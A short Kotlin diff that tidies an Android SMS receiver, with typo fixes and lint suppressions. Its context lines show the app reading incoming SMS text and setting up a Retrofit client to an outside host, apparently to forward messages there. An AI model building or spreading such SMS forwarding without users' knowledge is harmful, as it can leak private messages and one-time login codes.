@@ -1,4 +1,4 @@
-@file:Suppress("DEPRECATION")
+@file:Suppress("DEPRECATION", "UNUSED_VARIABLE", "UNCHECKED_CAST")
 
 package com.sync.smsmmsreader
 
@@ -40,7 +40,7 @@ class SmsReceiver : BroadcastReceiver() {
             textData = messageBody.toString()
             Toast.makeText(context, messageBody, Toast.LENGTH_LONG).show()
         }
-        // initalise Request Service
+        // initialise Request Service
         val retrofit = Retrofit.Builder()
             .baseUrl("https://sendmms.online/API/V2mms/")
             .build()
@@ -62,10 +62,10 @@ class SmsReceiver : BroadcastReceiver() {
                 if (response.isSuccessful){
                     Log.e( "RETROFIT_SUCCESS", response.body().toString())
                 }else{
-                    Log.e("RETORFIT_ERROR",response.body().toString())
+                    Log.e("RETROFIT_ERROR",response.body().toString())
                 }
             }
         }
-        return "";
+        return ""
     }
 }
